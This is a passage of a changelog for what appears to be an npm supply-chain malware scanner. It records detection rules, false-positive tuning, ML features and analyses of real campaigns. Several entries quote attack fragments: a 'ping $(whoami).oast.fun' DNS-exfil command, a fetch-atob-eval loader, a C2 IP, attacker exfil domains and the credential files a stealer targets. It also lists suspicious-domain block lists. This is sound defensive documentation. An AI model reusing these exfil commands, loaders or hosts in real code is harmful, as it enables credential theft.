  - F7 `placeholder_anti_dep_confusion` → cap 20
- When several caps apply, `Math.min()` wins (tightest cap). F5 always applies separately.
- Validated on 302-package human-reviewed corpus (198 FP + 104 malware): **67/198 FP capped (33.8 %)**, **0/104 malware impacted**. The 131 remaining FP CRITICAL packages don't match any of the 7 clusters and need a different approach (compound scoring dedup roadmap).
- Tests: 3258 → **3280** passed, 0 failed. Positive + negative tests for each of the 7 caps + composition test (F1+F3 simultaneously → cap = min(30, 30) = 30) + regression test on 67 adversarial samples (zero cap applied).
- Monitor emits `summary.contextualCaps[]` field listing applied caps.

### v2.10.96 — 8 ML contextual features (F1-F8) + plumbing

- 8 boolean contextual features added to `src/ml/feature-extractor.js` (lines 691-704). Each maps to a known FP cluster identified during the security review v2.10.93-95.
- F1-F7 active and computed at every scan, F8 (`install_script_no_network_egress`) volontairement laissee inerte (`= 0`) car `EGRESS_TYPES` ne couvre pas `dangerous_exec`/`lifecycle_dangerous_exec`/`node_inline_exec` et fire sur des malwares confirmes. A re-activer apres fix de `EGRESS_TYPES`.
- Plumbing: `src/scanner/npm-registry.js` extracts `homepage` from manifest (needed for F3), `src/scanner/ast-detectors/handle-post-walk.js` adds `threat.urls[]` (host extracted from each detected URL), `src/scanner/ast.js` passes context to post-walk handler, `src/pipeline/processor.js` propagates `fileSizes` + `homepage` + `threat.urls` to ML record builder, `src/monitor/ingestion.js` mirrors the same plumbing for the monitor.
- **Aucun changement de scoring, aucun changement de detection** (pure plomberie). Les scans v2.10.96 produisent les memes scores que v2.10.95.
- Tests: 3236 → **3258** passed, 0 failed. 22 nouveaux tests dans `tests/unit/ml-feature-extractor.test.js` couvrant les 7 features actives (positif/negatif/edge cases).

### v2.10.95 — Hash gate hardening + Windows EPERM fix

- `src/scanner/ast.js:211` : `hasHashVerification` heuristique durcie. Exige maintenant la presence d'un operateur de comparaison (`===`, `!==`, `.equals(`, `assert.strictEqual/equal/deepEqual/deepStrictEqual`, `throw`) en plus de `createHash + digest`. Bypass a 3 lignes ferme : un attaquant ne peut plus declencher le downgrade CRITICAL→HIGH de `download_exec_binary` avec juste `crypto.createHash('sha256').update(buf).digest('hex')` sans comparaison.
- `src/commands/evaluate.js` : 8 occurrences de `fs.rmSync(pkgCacheDir, ...)` enveloppees dans try/catch silencieux + 3 boucles `evaluateBenign`/`evaluateBenignPyPI`/`evaluateBenignRandom` wrappent `downloadAndExtract` + `silentScan` en try/catch. Un cleanup qui rate sur Windows (EPERM, file lock) ne tue plus une eval de 545 packages.
- **Triple-gate downgrade CRITICAL→MEDIUM abandonne** : un plan initial proposait un downgrade quand `download_exec_binary` co-occurre avec `hasHashVerification=true` ET `fetchOnlySafeDomains=true`. Diagnostic empirique sur 545 packages benign curated : **0 FPR delta** (15.60 % → 15.60 %). La rule fire sur 3 packages seulement (esbuild, yarn, @backstage/create-app), les 2 derniers etaient deja LOW, esbuild est domine par d'autres rules CRITICAL. Plan archive dans `data/fp-v2.10.95-validation.md` (gitignored).
- Tests: 3232 → **3236** passed, 0 failed. 4 nouveaux tests `download_exec_binary` (hash sans comparaison → CRITICAL nouveau gate, hash avec comparaison → HIGH preserve, etc.).

### v2.10.94 — Under-threshold malware fixes (4 scoped patches)

Apres v2.10.93 qui ajoutait les rules ltidi/csec/OAST/self_destruct_eval, un rescan empirique sur les tarballs reels de la semaine 2026-04-10 a 04-17 a mesure les scores effectifs et identifie 4 gaps restants :

- `src/scanner/package.js` — nouveau threat type `external_tarball_dep` (CRITICAL) emis a la place de `dependency_url_suspicious` quand l'URL pointe vers une tarball (.tgz/.tar.gz/.tar.bz2/.zip) sur un host non-allowlist (cloud storage, CDN random). Ajoute a `HIGH_CONFIDENCE_MALICE_TYPES` pour bypass le MT-1 score ceiling. Rule ID : `MUADDIB-PKG-020`.
- `src/scanner/ast-detectors/handle-new-expression.js` — nouveau threat type `function_runtime_args` (CRITICAL) emis quand `new Function()` recoit >= 2 args literal runtime (`require`, `__dirname`, `__filename`, `module`, `exports`, `process`) + body dynamique + obfuscation dans le meme fichier. Le gating obfuscation evite les FP sur les wrappers CommonJS legitimes (babel-register, ts-node, pirates, jest, nyc, vitest). Rule ID : `MUADDIB-AST-090`.
- `src/scanner/package.js` — `curl_env_exfil` etend son regex pour inclure `ping|nslookup|dig|host|getent`, catchant koa-v3 qui utilise `ping -c 1 $(whoami).<hex>.oast.fun`.
- `src/scoring.js` — nouveau floor a 75 quand 2+ threat types DISTINCTS sont CRITICAL package-level. Co-occurrence 2 CRITICAL package-level = signature quasi-certaine de malware.

Rescan empirique v2.10.93 → v2.10.94 : ltidi cmp-api-stub 35 → 50, csec-crypto-toolkit 19 → **88**, apache-arrow-14 50 → 75, koa-v3 9 → 75. Tests: 3230 → **3232** passed, 0 failed. 2 nouveaux tests `function_runtime_args`. Rules: 207 → **209** (204 RULES + 5 PARANOID).

### v2.10.93 — Security review 2026-04-10 to 04-17 : ltidi + csec + OAST remediation
- Review manuelle de 22 858 tarballs sur 8 jours, 37 malwares confirmés dont 10 sous le seuil de triage (ADR_THRESHOLD=20). Deux campagnes bypassaient entièrement la détection :
- **ltidi dependency chain attack** (9 packages, score 10) : stub packages sans install hooks, charge utile dans la dépendance `ltidisafe` hébergée sur `ltidi.storage.googleapis.com` comme tarball HTTPS. Payload confirmée par téléchargement et analyse : DNS exfil de hostname/homedir/username via sous-domaines hex `*.v519dosgqsrbgub2skqpw9azyq4oseg3.oastify.com`.
- **csec credential stealer** (3 packages, score 19) : variante de la campagne `plain-crypto-js` documentée par Resecurity (mars 2026). XOR avec clé `OrDeR_7077` + `new Function(decoded)` + `unlinkSync(__filename)` pour effacer les traces. Exfiltre `.env` sur 6 niveaux parents, tokens (GITHUB_TOKEN/NPM_TOKEN/AWS_*), clés SSH, `.npmrc`, `.aws/credentials` vers `csec-supply-chain-attack.vercel.app`.
- **package.js — `dependency_url_suspicious` escalation** : severity CRITICAL quand l'URL est une tarball (`.tgz`/`.tar.gz`/`.tar.bz2`/`.zip`) ET l'hôte n'est PAS sur une allowlist (`github.com`, `codeload.github.com`, `objects.githubusercontent.com`, `gitlab.com`, `bitbucket.org`, `registry.npmjs.org`, `registry.yarnpkg.com`). Les tarballs de cloud storage (GCS, S3, Azure blob) bypassent l'audit npm registry et correspondent au pattern ltidi.
- **ast.js + handle-post-walk.js — `self_destruct_eval` compound** (AST-089) : nouveau flag `ctx.hasSelfDelete` via regex content pour `unlinkSync`/`rmSync`/`renameSync` ciblant `__filename`/`module.filename`/`require.main.filename`. Compound CRITICAL quand `hasDynamicExec` ET `hasSelfDelete` dans le même fichier. Exempt de dist-file downgrade, dans `HIGH_CONFIDENCE_MALICE_TYPES` (bypass reputation attenuation).
- **constants.js — SUSPICIOUS_DOMAINS_HIGH** : ajout de `oast.online`, `oast.pro`, `interact.sh`, `projectdiscovery.io`, `csec-supply-chain-attack.vercel.app`, `files.giftedtech.co.ke` (Baileys V3 C2), `phish.sh` (depconf webhook exfil).
- **iocs/builtin.yaml** : +9 stubs ltidi + `ltidisafe` wildcard + 3 csec variants + `koa-v3@9.4.0` (typosquat + ping DNS exfil) + `cmp-api-stub@99.9.1` (ltidi session 2).
- Tests : 3134 → **3230** (8 nouveaux tests self_destruct_eval + 3 nouveaux tests dep URL escalation + 2 tests existants mis à jour de HIGH → CRITICAL pour les tarballs externes + 2 tests de compteur rule count mis à jour + 1 test compteur HC_TYPES mis à jour). Rules : 200 → **207** (202 RULES + 5 PARANOID). HC_TYPES : 22 → 23.
- Attendu en post-merge : ltidi stubs passent de score 10 à 50+ (dep_url CRITICAL 25 pts + dependency_ioc_match HIGH 10 pts + floor CRITICAL à 50). csec variants passent de 19 à 90+ (self_destruct_eval CRITICAL file-level + signaux existants, bypass reputation via HC_TYPES). Les 2 campagnes sortent du radar sous-threshold.

### v2.10.74 — FP Cluster Fixes (P1-P4) + TIER1 Sandbox Evasion Guard
- Forensic audit of 53,953 production alerts on 8,396 high-score packages, 78 deep-reviewed
- **P1** — Bundle FP downgrade: new `src/shared/bundle-detect.js` with extended `BUNDLE_PATH_RE` matching `.umd.js`/`.esm.js`/`.es.js`/`.common.js`/`.max.js`/hash-suffixed chunks/`fesm*`/`browser`/`assets`/`chunks`/`_app`/`lib/bundled`. New `hasBundleVetoSignal()` blocks downgrade when `reverse_shell`/`node_modules_write`/`npm_publish_worm`/`systemd_persistence`/`unicode_invisible_injection`/IOC signals present. Types with compound recovery (`staged_binary_payload`, `crypto_decipher`, `fetch_decrypt_exec`) intentionally excluded from `VETO_TYPES` to preserve `originalSeverity` gate. 14 packages recovered: babylonjs, electron, @kitware/vtk.js, dprint, @jetbrains/junie, @zuplo/core, @stencil/core, playwright, @equinor/echo-*, @alipay/ams-checkout, @testim/testim-cli, @vanwei-wcs/video-player-v2, @bookolosystem/engine, @epie/bi-crud.
- **P2** — AST-006 source qualification: new `ctx.varSource` Map in AST context tracks variable provenance (`string_literal`/`array_literal`/`object_literal`/`fs_readdir`/`require_json`/`function_call`/`computed_expression`/`env_var`). `handleCallExpression` now selects severity based on source: plugin loader patterns → LOW, `require(process.env.X)` → CRITICAL, real obfuscation → HIGH. Fixes 53 FP fires on legitimate plugin loaders (@itentialopensource/adapter-*, masterrecord, testim, apminsight, @teamfabric/xpm, @forklaunch/express).
- **P3** — AST-007 quick-scan downgrade: `src/pipeline/executor.js` quick-scan emits threats as MEDIUM (was HIGH) with new `degraded: true, quickScan: true` flags. `Module._load` stays CRITICAL (never legit). `scoring.js` excludes `degraded` non-CRITICAL threats from `max_file_score` and puts them in a separate `degradedScore` bucket capped at 15 points. Fixes 18+ FP fires on rsshub/dist-lib/*.mjs route handlers.
- **P4** — WASM/Emscripten artifact skip in `src/scanner/obfuscation.js`: `isWasmEmscriptenArtifact()` detects WASM files via basename (`mpg123-decoder`, `wasm-audio-decoders`, etc.) OR content markers (`Module["asm"]`, `HEAPU8`, `WebAssembly.instantiate`, `_emscripten_`, base64 magic `AGFzbQ`). Skipped from obfuscation heuristics only — other scanners (AST, dataflow, hash, IOC) continue to analyze these files. Fixes 52 FP fires on `@leoqlin/openclaw-qqbot/node_modules/mpg123-decoder/src/EmscriptenWasm.js`.
- **TIER1 sandbox evasion guard**: `isSuspectClassification()` in `src/monitor/classify.js` preserves tier 2 whenever any `TIER1_TYPES` finding is present — even at LOW severity. `enqueueDeferred()` in `src/monitor/deferred-sandbox.js` has matching exception to the `DEFERRED_MIN_SCORE` gate. Threat model: adversary tunes malware to fire only weak TIER1 patterns (e.g. `staged_payload` LOW + `sandbox_evasion` LOW) to bypass sandbox verification via the 2-distinct-types fallback.
- **react-emits ground truth fixture**: new GT-067 forensic fixture reproduces the live-detected malware (fake `path` module with two top-level IIFEs doing `fetch(atob(URL)).then(.json()).then(eval(data.content))`). Attack evolved v1.0.0 (split payload/trigger via 5 malicious deps) → v1.0.2 (URLs hardcoded in `path.js`) → v1.0.3 (broken half-retract). C2 IP `173.211.46.220` added to `iocs/builtin.yaml` markers (plain + base64 prefix).
- **`data/auto-labels.json` updates**: 4 new entries `react-emits@1.0.0-1.0.3` as `confirmed_malicious`, `@lystech/core@3.0.42` mutated from `pending` to `confirmed_malicious` (aggressive vendor telemetry pattern: silent `.github/workflows/` write during postinstall).
- Tests: 3068 → **3134** across 66 files. Rules: **200** (195 RULES + 5 PARANOID, unchanged — P2 extends AST-006 without splitting). Ground truth: 66 → **67** samples.
- Estimated FPR improvement: 14.0% → **6-9%** (-5 to -8 points). TPR maintained at 93.75% (60/64). Measurement deferred to post-release sweep.

### v2.10.5 — ML Models + Audit Fondamental
- ML1 XGBoost trained: P=0.978, R=0.933, F1=0.955 (114 trees, 21 features)
- ML2 Bundler detector trained: P=0.992, R=1.000, F1=0.996 (98 trees, 30 features)
- Audit fondamental: 8176 contaminated "fp" labels cleaned to "unconfirmed"
- Webhook triage P1/P2/P3: `computeAlertPriority()` with visual classification
- 3 new compound scoring rules: lifecycle_dataflow, lifecycle_dangerous_exec, obfuscated_lifecycle_env
- Lifecycle guard, score-0 investigation script, LLM triage design doc
- Honey environment: canary tokens, Docker camouflage
- Tests: 2533 → **2643** across 57 files. Rules: 158 → **162** (157 RULES + 5 PARANOID)
- Wild TPR: **92.8%** (13538/14587). FPR curated: **11.0%** (58/529)

### v2.10.1 — Security Audit v3
- 6 bypasses closed, 5 new detection rules
- WebSocket/MQTT/Socket.IO sink detection, split entropy payload, lifecycle-file-exec compound
- FPR curated: 13.2% → **10.8%** (57/529). FPR random: 8.0% → **7.5%** (15/200)
- Tests: 2477 → **2533** across 56 files. Rules: 153 → **158** (153 RULES + 5 PARANOID)

### v2.10.0 — ML Classifier Phase 2
- XGBoost-based binary classifier for T1 zone FP reduction (stub model)
- 71 features (62 → 71), ML filter in monitor pipeline
- Tests: 2435 → **2477** across 56 files

### v2.9.9 — Security Audit v2 Remediation
- 5 bypass remediations (config neutralization, BinaryExpression concat, process.mainModule.require, Module._load)
- 1 new rule: AST-056 `module_load_bypass`
- Tests: **2435** across 54 files
- Rules: **153** (148 RULES + 5 PARANOID)

### v2.9.4 — Red Team v7 Blue Team
- 3 FP fixes, 3 quick wins
- ADR: **96.3%** (103/107)
- Tests: **2336** across 50 files

### v2.9.2 — Compound Scoring Rules
- 4 compound scoring rules: co-occurring threat types that never appear in benign packages
- `applyCompoundBoosts()` in scoring.js, called after applyFPReductions
- `dangerous_exec` added to DIST_EXEMPT_TYPES
- Tests: 2300 → **2329**. Rules: 147 → **152** (147 RULES + 5 PARANOID)

### v2.9.1 — GlassWorm Detection
- GlassWorm campaign: Unicode invisible + Blockchain C2 detection
- 3 new AST rules (AST-053/054/055), 1 new OBF rule (OBF-003)
- 6 GlassWorm C2 IPs, 8 compromised packages IOC
- Tests: 2266 → **2300**. Rules: 143 → **147** (142 RULES + 5 PARANOID)

### v2.9.0 — Supply-Chain Detection Expansion
- 8 new rules: bin_field_hijack (PKG-013), npm_publish_worm (AST-051), node_modules_write (AST-048), bun_runtime_evasion (AST-049), static_timer_bomb (AST-050), ollama_local_llm (AST-052), network_require (PKG-011), node_inline_exec (PKG-012)
- Additional PKG rules: git_dependency_rce (PKG-014), npmrc_git_override (PKG-015), lifecycle_hidden_payload (PKG-016)
- Tests: 2222 → **2266**. Rules: 134 → **143** (138 RULES + 5 PARANOID)

### v2.8.6–v2.8.7 — ML Pipeline
- ML feature extraction pipeline: 62 features per package scan
- JSONL feature export for offline model training
- Test optimization P1-P3 (373s → 134s)

### v2.8.0 — npm Changes Stream
- Real-time npm monitoring via changes stream (replaces RSS polling)
- Parallel scan processing (concurrency=3→5)
- Daily stats persistence

### v2.7.9–v2.7.10 — Hardening
- v2.7.9: IPv6 SSRF fix, preload hardening, FP audit trail
- v2.7.10: Confidence-weighted scoring, zip bomb protection

### v2.7.8 — Size Cap, MCP Awareness, Scan Memory
- Size cap 20MB: bypass full scan for packages >20MB (IOC and lifecycle exceptions)
- MCP server awareness: mcp_config_injection CRITICAL→MEDIUM for SDK packages
- Scan history memory: cross-session webhook dedup via scan-memory.json (30d, 50K max, ±15%)
- Tests: 2143 → **2166** (+23)

### v2.7.7 — Destination-Aware Intent
- `isSDKPattern()` with 22 curated SDK env-domain mappings
- `SUSPICIOUS_DOMAIN_PATTERNS` blocks tunneling services and raw IPs
- HC bypass severity check in monitor
- Tests: 2093 → **2143** (+50)

### v2.7.6 — HC Bypass, Graduated Threshold
- HIGH_CONFIDENCE_MALICE_TYPES (19 types) bypass reputation attenuation
- Aggressive reputation tiers: floor 0.30→0.10
- Graduated webhook threshold: 35/25/20 based on establishment
- Fix double DORMANT log
- Tests: 2093 → **2093** (monitor-only changes)

### v2.7.5 — Webhook Noise Reduction
- Self-exclude muaddib-scanner from pollNpm()
- WASM standalone rule (AST-046, MEDIUM)
- Reputation scoring: computeReputationFactor() with age/versions/downloads
- Scope dedup: bufferScopedWebhook() for monorepo noise
- Tests: 2042 → **2093** (+51). Rules: 133 → **134** (129 RULES + 5 PARANOID)

### v2.6.9 — Audit Remediation P2
- SSRF IPv6 bypass fix, monitor scoring alignment, eval methodology fixes
- 3 new shell IFS evasion rules (SHELL-016 to SHELL-018), charcode validation
- Tests: 2009 → **2042** (+33). Rules: 130 → **133** (128 RULES + 5 PARANOID)

### v2.6.5 — Audit Remediation
- 6 phases: safety, detection bypasses, evaluation methodology, IOC validation, paranoid mode, documentation
- Tests: 1940 → **1974** (+34)

### v2.6.0 — Red Team DPRK + Intent Graph
- 10 new adversarial samples, intent graph (intra-file source-sink coherence)
- 2 new rules: INTENT-001, INTENT-002
- Tests: 1869 → **1940** (+71). Rules: 121 → **129** (124 RULES + 5 PARANOID)

### v2.5.13–v2.5.14 — Audit Hardening
- v2.5.13: Scoring thresholds, IOC integrity, sandbox NODE_OPTIONS, dataflow Promise/.then(), deobfuscation TemplateLiteral. Tests: 1656 → **1790** (+134)
- v2.5.14: AST bypasses, dataflow taint, shell patterns (SHELL-013 to SHELL-015), entropy (ENTROPY-004), typosquat whitelist. Tests: 1790 → **1815** (+25). Rules: 117 → **121** (116 RULES + 5 PARANOID)

### v2.5.0–v2.5.8 — Security Audit + FP Reduction P4
- 41 issues remediated (14 CRITICAL, 18 HIGH, 9 MEDIUM)
- FP Reduction P4: IOC wildcard audit, webhook noise reduction
- Tests: 1522 → **1656** (+134). Rules: 107 → **113** (108 RULES + 5 PARANOID)

### v2.4.7–v2.4.9 — Vague 4 Blue Team + Sandbox Preload
- v2.4.7: 5 adversarial samples, resolveStringConcat(), 3 new rules (AST-033/034/035). ADR: 98.8% (82/83)
- v2.4.9: Multi-run sandbox preload for time-bomb detection. 6 new rules (SANDBOX-009 to 014). Rules: 102 → **121** (116 RULES + 5 PARANOID)

### v2.3.0–v2.3.1 — FP Reduction P2+P3
- FPR: ~13% → 8.9% → **7.4%** (39/525)
- 8 new rules (AST-024 to AST-031). Tests: 1317 → **1387**

### v2.2.x — Evaluation Framework + Coverage
- v2.2.6: Inter-module dataflow (module-graph.js)
- v2.2.8–v2.2.9: FP Reduction P1 (38% → 17.5%)
- v2.2.11: Per-file max scoring (FPR ~13%)
- v2.2.12: Ground truth expansion (51 samples, 93.9% TPR)
- v2.2.22: Scan freeze fix (EXCLUDED_DIRS)
- v2.2.24: Coverage expansion (862 → 1317 tests, 72% → 86%)

### v2.0 — Behavioral Anomaly Detection
- 5 features: temporal lifecycle, AST diff, publish anomaly, maintainer change, canary tokens

### v1.x — IOC-Based Detection
- IOC matching, pattern scanning, basic AST analysis
